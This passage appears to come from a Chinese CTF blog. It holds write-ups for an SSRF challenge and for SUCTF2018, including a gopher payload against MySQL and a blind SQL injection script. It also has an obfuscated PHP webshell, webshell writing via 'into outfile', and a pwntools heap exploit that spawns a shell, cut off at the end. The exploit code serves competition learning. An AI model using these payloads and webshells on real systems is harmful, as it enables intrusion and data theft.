class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a100000185a6ff0100000001210000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033337320f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c</span><br><span class=\"line\">210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031</span><br><span class=\"line\">120000000353454c4543542044415441424153452829</span><br><span class=\"line\">0500000002666c6167</span><br><span class=\"line\">0f0000000373686f7720646174616261736573</span><br><span class=\"line\">0c0000000373686f77207461626c6573</span><br><span class=\"line\">0600000004666c616700</span><br><span class=\"line\">0700000004676f6f647300</span><br><span class=\"line\">0600000004696e666f00</span><br><span class=\"line\">0700000004757365727300</span><br><span class=\"line\">130000000373656c656374202a2066726f6d20666c6167</span><br><span class=\"line\">0100000001</span><br></pre></td></tr></table></figure>\n<p>将上边的数据合为一行，并使用url编码。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%a1%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%64%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%03%33%37%32%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%05%00%00%00%02%66%6c%61%67%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%07%00%00%00%04%67%6f%6f%64%73%00%06%00%00%00%04%69%6e%66%6f%00%07%00%00%00%04%75%73%65%72%73%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01</span><br></pre></td></tr></table></figure>\n<p>使用gopher协议发送数据。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl gopher://127.0.0.1:3306/_%a1%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%64%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%03%33%37%32%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%05%00%00%00%02%66%6c%61%67%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%07%00%00%00%04%67%6f%6f%64%73%00%06%00%00%00%04%69%6e%66%6f%00%07%00%00%00%04%75%73%65%72%73%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01</span><br></pre></td></tr></table></figure>\n<p>得到结果:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">J</span><br><span class=\"line\">f☻ §          3cPWM7S♀9^&apos; mysql_native_password   ☻   ☻   ☺  ☺☺&apos;  ☻♥def   ◄@@version_comment ♀! T     ▼  ↔  ♥∟MySQL Community Server (GPL)  ♦  ☻   ☺  ☺☺   ☻♥def</span><br><span class=\"line\">DATABASE() ♀! f     ▼  ☺  ♥  ♦  ☻   ►  ☺   ☻@   ☺♣♦flag☺  ☺☺K  ☻♥def↕information_schemSCHEMATSCHEMATDatabase♂SCHEMA_NAM♀!    ☺    ‼  ♥↕information_schema♦  ♦♥app         bd_study♣  ♠♦blog♂</span><br><span class=\"line\">challenges♠ ♣crawl♦     ♥ctf</span><br><span class=\"line\">graduate_hnis♠  ☼♣hetaomwjs♣</span><br><span class=\"line\">  ►     homestead♠  ◄♣jewe  ↕jiansh  ‼mybatis♠  ¶♣mysql   netclass♠  ■♣nuomi♦  ↨♥o2o‼  ↑↕performance_schema       securixiaomi2chinaz  $♠ydjxpt&quot;  %!yolanda_information_collection_02♠  &amp;♣yshop♠  &apos;♣zhihu  (  &quot;   ☺  ☺☺V  ☻♥def↕information_schema♂TABLE_NAMES♂TABLE_NAMES♫Tables_in_flag</span><br><span class=\"line\">TABLE_NAME♀!    ☺    ♣  ♥♦flag♠  ♦♣goods♣  ♣♦info♠  ♠♣users    &quot;   +  ☺♥def♦flag♦flag♦flag♦flag♦flag♀! ♂         ☻  ☻</span><br><span class=\"line\">,  ☺♥def♦flag♣goods♣goods♥uid♥uid♀? ♂   ♥♥B   ☺0-  ☻♥def♦flag♣goods♣goods♦name♦name♀!    ♣P    ;  ♥♥def♦flag♣goods♣good♂description♂description♀! X☻  ☺►    +  ♦♥def♦flag♣goods♣goods♥img♥img♀! X☻  ☺►      ♣  ☻   (  ☺♥def♦flag♦info♦info☻id☻i♀? ♂   ♥♥B   ☺0+  ☻♥def♦flag♦info♦info♦user♦user♀! ,☺  ☺►    *  ♥♥def♦flag♦info♦info♥gid♥gid♀? ♂   ♥☺►   ☺0  ♦  ☻   ,  ☺♥def♦flag♣users♣users♥uid♥uid♀? ♂   ♥♥B   ☺0-  ☻♥def♦flag♣users♣users♦user♦user♀!    ♣P    1  ♥♥def♦flag♣users♣users♠passwd♠passwd♀!    ☺►      ♦  ☻   ☺  ☺☺*  ☻♥def♦flag♦flag♦flag♦flag♦flag♀! ♂          ♥▼CTF&#123;SSRF_GOPHER_CAN_YOU_GOT_IT&#125;  ♦</span><br></pre></td></tr></table></figure>\n<p>虽然有些乱码，我们可以看到，查询的flag出现了。    </p>\n</li>\n<li><p>修改sql语句。</p>\n<blockquote>\n<p>130000000373656c656374202a2066726f6d20666c6167</p>\n</blockquote>\n<p>原始数据中，改行即对应着sql语句，结构如下:</p>\n<blockquote>\n<p>hex(sql语句长度加1) + 固定字段(00000003 ) + sql语句16进制编码</p>\n</blockquote>\n<p>修改该行，即可获得执行对应的sql语句。</p>\n</li>\n</ol>\n<h3 id=\"利用脚本\"><a href=\"#利用脚本\" class=\"headerlink\" title=\"利用脚本\"></a>利用脚本</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">str_hex</span><span class=\"params\">(data)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> str(hex(data)).replace(<span class=\"string\">'0x'</span>,<span class=\"string\">''</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encode</span><span class=\"params\">(query)</span>:</span></span><br><span class=\"line\">    enc_query = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> query:</span><br><span class=\"line\">        enc_query += str_hex(ord(i))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> enc_query</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">gen_payload</span><span class=\"params\">(query)</span>:</span></span><br><span class=\"line\">    payload = <span class=\"string\">'a100000185a6ff0100000001210000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033337320f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031120000000353454c45435420444154414241534528290500000002666c61670f0000000373686f77206461746162617365730c0000000373686f77207461626c65730600000004666c6167000700000004676f6f6473000600000004696e666f000700000004757365727300'</span></span><br><span class=\"line\">    payload += str_hex(len(query)+<span class=\"number\">1</span>)</span><br><span class=\"line\">    payload += <span class=\"string\">'00000003'</span></span><br><span class=\"line\">    payload += encode(query)</span><br><span class=\"line\">    payload += <span class=\"string\">'0100000001'</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">result</span><span class=\"params\">(payload)</span>:</span></span><br><span class=\"line\">    result = [payload[i:i+<span class=\"number\">2</span>] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,len(payload),<span class=\"number\">2</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> binascii.b2a_hex(<span class=\"string\">b\"gopher://127.0.0.1:3306/_%\"</span>+<span class=\"string\">\"%\"</span>.join(result))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exp</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    url = <span class=\"string\">\"http://128.199.179.156/info.php\"</span></span><br><span class=\"line\">    cookie = &#123;</span><br><span class=\"line\">        <span class=\"string\">'PHPSESSID'</span>:<span class=\"string\">'av7963h17c1qukv4jm4gklvoi1'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">127</span>,<span class=\"number\">32</span>,<span class=\"number\">-1</span>):</span><br><span class=\"line\">            <span class=\"keyword\">print</span> <span class=\"string\">'j:'</span>+str(j)</span><br><span class=\"line\">            query = <span class=\"string\">\"select * from flag.flag where IF(ascii(substr((select * from flag.flag),%s,1)) =%s,sleep(5),1);\"</span> % (str(i),str(j))</span><br><span class=\"line\">            uid = <span class=\"string\">\"?uid=%1$'%20union%20select%201,1,0x\"</span> + result(gen_payload(query)) + <span class=\"string\">\"%23\"</span></span><br><span class=\"line\">            fullurl = url + uid</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                r = requests.get(fullurl,cookies=cookie,timeout=<span class=\"number\">5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                flag += chr(j)</span><br><span class=\"line\">                print(flag)</span><br><span class=\"line\">                i = i+<span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    print(flag)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    exp()</span><br></pre></td></tr></table></figure>\n"},{"title":"suctf2018","date":"2018-05-28T08:46:05.000Z","password":654321,"_content":"\n# SUCTF2018\n\n<!--more-->\n\n赛后总结\n\ndocker仓库：\n\n```\nsuctf/2018-web-multi_sql\nsuctf/2018-web-homework\nsuctf/2018-web-hateit\nsuctf/2018-web-getshell\nsuctf/2018-web-annonymous\nsuctf/2018-pwn-note\nsuctf/2018-pwn-noend\nsuctf/2018-pwn-lock2\nsuctf/2018-pwn-heapprint\nsuctf/2018-pwn-heap\nsuctf/2018-misc-padding\nsuctf/2018-misc-game\nsuctf/2018-misc-rsagood\nsuctf/2018-misc-rsa\nsuctf/2018-misc-enjoy\nsuctf/2018-misc-pass\n```\n\n## Anonymous\n\n```\n<?php\n$MY = create_function(\"\",\"die(`cat flag.php`);\");\n$hash = bin2hex(openssl_random_pseudo_bytes(32));\neval(\"function SUCTF_$hash(){\"\n    .\"global \\$MY;\"\n    .\"\\$MY();\"\n    .\"}\");\nif(isset($_GET['func_name'])){\n    $_GET[\"func_name\"]();\n    die();\n}\nshow_source(__FILE__);\n```\n\nsolve.py\n\n```\nimport requests\nimport socket\nimport time\nfrom multiprocessing.dummy import Pool as ThreadPool\ntry:\n    requests.packages.urllib3.disable_warnings()\nexcept:\n    pass\n\ndef run(i):\n    while 1:\n        HOST = 'web.suctf.asuri.org'\n        PORT = 81\n        url = \"http://web.suctf.asuri.org:81/index.php\"\n        requests.get(url)\n        print 'ok'\n        time.sleep(0.5)\n        print requests.get('http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1').content\n\ni = 8\npool = ThreadPool( i )\nresult = pool.map_async( run, range(i) ).get(0xffff)\n```\n\n## Getshell\n\n```\nif($contents=file_get_contents($_FILES[\"file\"][\"tmp_name\"])){\n    $data=substr($contents,5);\n    foreach ($black_char as $b) {\n        if (stripos($data, $b) !== false){\n            die(\"illegal char\");\n        }\n    }     \n}\n```\n\n使用burp intruder找出未被过滤的可打印字符串。\n\n```\n$()[]_~=;.\n```\n\n跑的时候需注意`Intruder=>payloads=>payload encoding` 处需取消勾选，否则会因为字符编码而不能得到正确的白名单。\n\n跑的时候可以在`Intruder=>options=>Grep-Match` 中选择 flag `illegal` ，这样就可以快速看到那些字符是合法的了。\n\nshell:\n\n```\n<?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_____=~得[$_];$______=~第[$_];$_______=~学[$_];$_=_.$__.$___.$____;$_=$$_;$__=$_____.$______.$______.$___.$_______.$____;$__($_[_]);\n```\n\n```\n<?= \n$_=_==_;//1\n$__=~一[$_];//G\n$___=~了[$_];//E\n$____=~端[$_];//T\n$_____=~得[$_];//A\n$______=~第[$_];//S\n$_______=~学[$_];//R\n$_=_.$__.$___.$____;//_GET\n$_=$$_;//$_GET\n$__=$_____.$______.$______.$___.$_______.$____;//ASSERT\n$__($_[_]);//ASSERT($_GET[_]);\n```\n\n```\n<?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);\n```\n\n```\n$_=_==_;//1\n$__=~一[$_];//G\n$___=~了[$_];//E\n$____=~端[$_];//T\n$_=_.$__.$___.$____;//_GET\n$_=$$_;//$_GET\n$_[_]($_[__]);//$_GET[_]($_GET[__]);\n```\n\n## MultiSql\n\n```\n@@secure_file_priv           限制intofile可以写入的文件目录\n```\n\nwaf.php\n\n```\n<?php\n\tfunction waf($str){\n\t\t$black_str = \"/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&])/i\";\n\t\t$str = preg_replace($black_str, \"@@\",$str);\n\t\treturn addslashes($str);\n\t}\n```\n\nsql注入关键代码:\n\n```\nif (isset($_SESSION['user_name'])) {\n\tinclude_once('../header.php');\n\tif (!isset($SESSION['user_id'])) {\n\t\t$sql = \"SELECT * FROM dwvs_user_message WHERE DWVS_user_name =\".\"'{$_SESSION['user_name']}'\";\n\techo $sql;\t\t\n$data = mysqli_query($connect,$sql) or die('Mysql Error!!');\n\t\t$result = mysqli_fetch_array($data);\n\t\tvar_dump($result);\n\t\t$_SESSION['user_id'] = $result['DWVS_user_id'];\n\t}\n\n\t$html_avatar = htmlspecialchars($_SESSION['user_favicon']);\n\t\n\t\n\tif(isset($_GET['id'])){\n\t\t$id=waf($_GET['id']);\n\t\t$sql = \"SELECT * FROM dwvs_user_message WHERE DWVS_user_id =\".$id;\n\t\t$data = mysqli_multi_query($connect,$sql) or die();\n\t\t\n\t\t$result = mysqli_store_result($connect);\n\t\t$row = mysqli_fetch_row($result);\n\t\techo '<h1>user_id:'.$row[0].\"</h1><br><h2>user_name:\".$row[1].\"</h2><br><h3>注册时间：\".$row[4].\"</h3>\";\n\t\tmysqli_free_result($result);\n\t\tdie();\n\t}\n\tmysqli_close($connect);\n```\n\n使用set跟hex编码的方式执行sql语句:\n\n```\nselect user()                    =>   0x73656c65637420757365722829\n```\n\n```\nset @num=0x73656c65637420757365722829;prepare t from @num;execute t;\n```\n\n写shell:\n\n```\n<?php eval($_REQUEST['55332']);?>       =>   0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e   \n```\n\n```\nset @num=0x73656c65637420307833633366373036383730323036353736363136633238323435663532343535313535343535333534356232373335333533333333333232373564323933623366336520696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f77666f782e70687027;prepare t from @num;execute t;\n```\n\n```\nselect 0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e into outfile '/var/www/html/favicon/wfox.php'\n```\n\n方法二:\n\n注册两个账号:\n\n```sql\n<?=$_GET[c];?>                                        \n\n<?=$_GET[c];?>'into outfile'/var/www/html/favicon/c1.php \n```\n\n这样，当使用第二个账号登录的时候:\n\n```\n$sql = \"SELECT * FROM dwvs_user_message WHERE DWVS_user_name =\".\"'{$_SESSION['user_name']}'\";\n$sql = \"SELECT * FROM dwvs_user_message WHERE DWVS_user_name ='<?=$_GET[c];?>'into outfile'/var/www/html/favicon/c1.php ' into outfile '/var/www/html/favicon/c1.php';\n```\n\n就会将我们的shell写入账号。\n\n# PWN\n\n## Note\n\n```\n#!/usr/bin/env python2\n\nfrom pwn import *\nfrom IPython import embed\nimport re\n\ncontext.arch = 'amd64'\n\nr = remote('pwn.suctf.asuri.org', 20003)\n\ndef add(size, content):\n    r.sendlineafter('>>', '1')\n    r.sendlineafter('Size:', str(size))\n    r.sendlineafter('Content:', content)\n\ndef show(idx):\n    r.sendlineafter('>>', '2')\n    r.sendlineafter('Index:', str(idx))\n    r.recvuntil('Content:')\n    return r.recvuntil('1.Add a not', drop=True)\n\ndef pandora():\n    r.sendlineafter('>>', '3')\n    r.sendlineafter('yes:1)', '1')\n\n\nadd(10, 'a'*24+flat(0xec1))\nadd(4000, 'a')\npandora()\nx = show(0).strip()\nheap = u64(x.ljust(8, '\\x00')) - 0x140\nprint 'heap:', hex(heap)\nadd(0x90-8, 'a'*7)\nx = show(1).strip()\nlibc = u64(x.ljust(8, '\\x00')) - 0x3bfb58\nprint 'libc:', hex(libc)\n\n#_IO_list_all = libc + 0x3c5520\n_IO_list_all = libc + 0x3c0500\n_IO_str_jumps = libc + 0x3bc4c0\n#system = libc + 0x45390\nsystem = libc + 0x456d0\npop_rax_rbx_rbp = libc + 0x1fa71\nret = libc + 0x1fa74\nadd(10, flat(\n    'a'*16,\n    0x0, 0x61,\n    0, _IO_list_all-0x10,\n    0, 1,\n    0, heap+0x1a0, heap+0x1a0,      # buf_base to heap & buf_end-buf_base==0\n    [0]*18, _IO_str_jumps,\n    ret, system,                    # malloc do nothing, free(buf_base) == system('/bin/sh')\n    '/bin/sh\\x00',\n))\n\n#raw_input(\"@\")\nr.sendlineafter('>>', '1')\nr.sendlineafter('Size:', '10')\n\n#embed()\nr.interactive()\n```\n\n","source":"_posts/suctf2018.md","raw":"---\ntitle: suctf2018\ndate: 2018-05-28 16:46:05\ntags: ctf\npassword: 654321\n---\n\n# SUCTF2018\n\n<!--more-->\n\n赛后总结\n\ndocker仓库：\n\n```\nsuctf/2018-web-multi_sql\nsuctf/2018-web-homework\nsuctf/2018-web-hateit\nsuctf/2018-web-getshell\nsuctf/2018-web-annonymous\nsuctf/2018-pwn-note\nsuctf/2018-pwn-noend\nsuctf/2018-pwn-lock2\nsuctf/2018-pwn-heapprint\nsuctf/2018-pwn-heap\nsuctf/2018-misc-padding\nsuctf/2018-misc-game\nsuctf/2018-misc-rsagood\nsuctf/2018-misc-rsa\nsuctf/2018-misc-enjoy\nsuctf/2018-misc-pass\n```\n\n## Anonymous\n\n```\n<?php\n$MY = create_function(\"\",\"die(`cat flag.php`);\");\n$hash = bin2hex(openssl_random_pseudo_bytes(32));\neval(\"function SUCTF_$hash(){\"\n    .\"global \\$MY;\"\n    .\"\\$MY();\"\n    .\"}\");\nif(isset($_GET['func_name'])){\n    $_GET[\"func_name\"]();\n    die();\n}\nshow_source(__FILE__);\n```\n\nsolve.py\n\n```\nimport requests\nimport socket\nimport time\nfrom multiprocessing.dummy import Pool as ThreadPool\ntry:\n    requests.packages.urllib3.disable_warnings()\nexcept:\n    pass\n\ndef run(i):\n    while 1:\n        HOST = 'web.suctf.asuri.org'\n        PORT = 81\n        url = \"http://web.suctf.asuri.org:81/index.php\"\n        requests.get(url)\n        print 'ok'\n        time.sleep(0.5)\n        print requests.get('http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1').content\n\ni = 8\npool = ThreadPool( i )\nresult = pool.map_async( run, range(i) ).get(0xffff)\n```\n\n## Getshell\n\n```\nif($contents=file_get_contents($_FILES[\"file\"][\"tmp_name\"])){\n    $data=substr($contents,5);\n    foreach ($black_char as $b) {\n        if (stripos($data, $b) !== false){\n            die(\"illegal char\");\n        }\n    }     \n}\n```\n\n使用burp intruder找出未被过滤的可打印字符串。\n\n```\n$()[]_~=;.\n```\n\n跑的时候需注意`Intruder=>payloads=>payload encoding` 处需取消勾选，否则会因为字符编码而不能得到正确的白名单。\n\n跑的时候可以在`Intruder=>options=>Grep-Match` 中选择 flag `illegal` ，这样就可以快速看到那些字符是合法的了。\n\nshell:\n\n```\n<?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_____=~得[$_];$______=~第[$_];$_______=~学[$_];$_=_.$__.$___.$____;$_=$$_;$__=$_____.$______.$______.$___.$_______.$____;$__($_[_]);\n```\n\n```\n<?= \n$_=_==_;//1\n$__=~一[$_];//G\n$___=~了[$_];//E\n$____=~端[$_];//T\n$_____=~得[$_];//A\n$______=~第[$_];//S\n$_______=~学[$_];//R\n$_=_.$__.$___.$____;//_GET\n$_=$$_;//$_GET\n$__=$_____.$______.$______.$___.$_______.$____;//ASSERT\n$__($_[_]);//ASSERT($_GET[_]);\n```\n\n```\n<?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);\n```\n\n```\n$_=_==_;//1\n$__=~一[$_];//G\n$___=~了[$_];//E\n$____=~端[$_];//T\n$_=_.$__.$___.$____;//_GET\n$_=$$_;//$_GET\n$_[_]($_[__]);//$_GET[_]($_GET[__]);\n```\n\n## MultiSql\n\n```\n@@secure_file_priv           限制intofile可以写入的文件目录\n```\n\nwaf.php\n\n```\n<?php\n\tfunction waf($str){\n\t\t$black_str = \"/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&])/i\";\n\t\t$str = preg_replace($black_str, \"@@\",$str);\n\t\treturn addslashes($str);\n\t}\n```\n\nsql注入关键代码:\n\n```\nif (isset($_SESSION['user_name'])) {\n\tinclude_once('../header.php');\n\tif (!isset($SESSION['user_id'])) {\n\t\t$sql = \"SELECT * FROM dwvs_user_message WHERE DWVS_user_name =\".\"'{$_SESSION['user_name']}'\";\n\techo $sql;\t\t\n$data = mysqli_query($connect,$sql) or die('Mysql Error!!');\n\t\t$result = mysqli_fetch_array($data);\n\t\tvar_dump($result);\n\t\t$_SESSION['user_id'] = $result['DWVS_user_id'];\n\t}\n\n\t$html_avatar = htmlspecialchars($_SESSION['user_favicon']);\n\t\n\t\n\tif(isset($_GET['id'])){\n\t\t$id=waf($_GET['id']);\n\t\t$sql = \"SELECT * FROM dwvs_user_message WHERE DWVS_user_id =\".$id;\n\t\t$data = mysqli_multi_query($connect,$sql) or die();\n\t\t\n\t\t$result = mysqli_store_result($connect);\n\t\t$row = mysqli_fetch_row($result);\n\t\techo '<h1>user_id:'.$row[0].\"</h1><br><h2>user_name:\".$row[1].\"</h2><br><h3>注册时间：\".$row[4].\"</h3>\";\n\t\tmysqli_free_result($result);\n\t\tdie();\n\t}\n\tmysqli_close($connect);\n```\n\n使用set跟hex编码的方式执行sql语句:\n\n```\nselect user()                    =>   0x73656c65637420757365722829\n```\n\n```\nset @num=0x73656c65637420757365722829;prepare t from @num;execute t;\n```\n\n写shell:\n\n```\n<?php eval($_REQUEST['55332']);?>       =>   0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e   \n```\n\n```\nset @num=0x73656c65637420307833633366373036383730323036353736363136633238323435663532343535313535343535333534356232373335333533333333333232373564323933623366336520696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f77666f782e70687027;prepare t from @num;execute t;\n```\n\n```\nselect 0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e into outfile '/var/www/html/favicon/wfox.php'\n```\n\n方法二:\n\n注册两个账号:\n\n```sql\n<?=$_GET[c];?>                                        \n\n<?=$_GET[c];?>'into outfile'/var/www/html/favicon/c1.php \n```\n\n这样，当使用第二个账号登录的时候:\n\n```\n$sql = \"SELECT * FROM dwvs_user_message WHERE DWVS_user_name =\".\"'{$_SESSION['user_name']}'\";\n$sql = \"SELECT * FROM dwvs_user_message WHERE DWVS_user_name ='<?=$_GET[c];?>'into outfile'/var/www/html/favicon/c1.php ' into outfile '/var/www/html/favicon/c1.php';\n```\n\n就会将我们的shell写入账号。\n\n# PWN\n\n## Note\n\n```\n#!/usr/bin/env python2\n\nfrom pwn import *\nfrom IPython import embed\nimport re\n\ncontext.arch = 'amd64'\n\nr = remote('pwn.suctf.asuri.org', 20003)\n\ndef add(size, content):\n    r.sendlineafter('>>', '1')\n    r.sendlineafter('Size:', str(size))\n    r.sendlineafter('Content:', content)\n\ndef show(idx):\n    r.sendlineafter('>>', '2')\n    r.sendlineafter('Index:', str(idx))\n    r.recvuntil('Content:')\n    return r.recvuntil('1.Add a not', drop=True)\n\ndef pandora():\n    r.sendlineafter('>>', '3')\n    r.sendlineafter('yes:1)', '1')\n\n\nadd(10, 'a'*24+flat(0xec1))\nadd(4000, 'a')\npandora()\nx = show(0).strip()\nheap = u64(x.ljust(8, '\\x00')) - 0x140\nprint 'heap:', hex(heap)\nadd(0x90-8, 'a'*7)\nx = show(1).strip()\nlibc = u64(x.ljust(8, '\\x00')) - 0x3bfb58\nprint 'libc:', hex(libc)\n\n#_IO_list_all = libc + 0x3c5520\n_IO_list_all = libc + 0x3c0500\n_IO_str_jumps = libc + 0x3bc4c0\n#system = libc + 0x45390\nsystem = libc + 0x456d0\npop_rax_rbx_rbp = libc + 0x1fa71\nret = libc + 0x1fa74\nadd(10, flat(\n    'a'*16,\n    0x0, 0x61,\n    0, _IO_list_all-0x10,\n    0, 1,\n    0, heap+0x1a0, heap+0x1a0,      # buf_base to heap & buf_end-buf_base==0\n    [0]*18, _IO_str_jumps,\n    ret, system,                    # malloc do nothing, free(buf_base) == system('/bin/sh')\n    '/bin/sh\\x00',\n))\n\n#raw_input(\"@\")\nr.sendlineafter('>>', 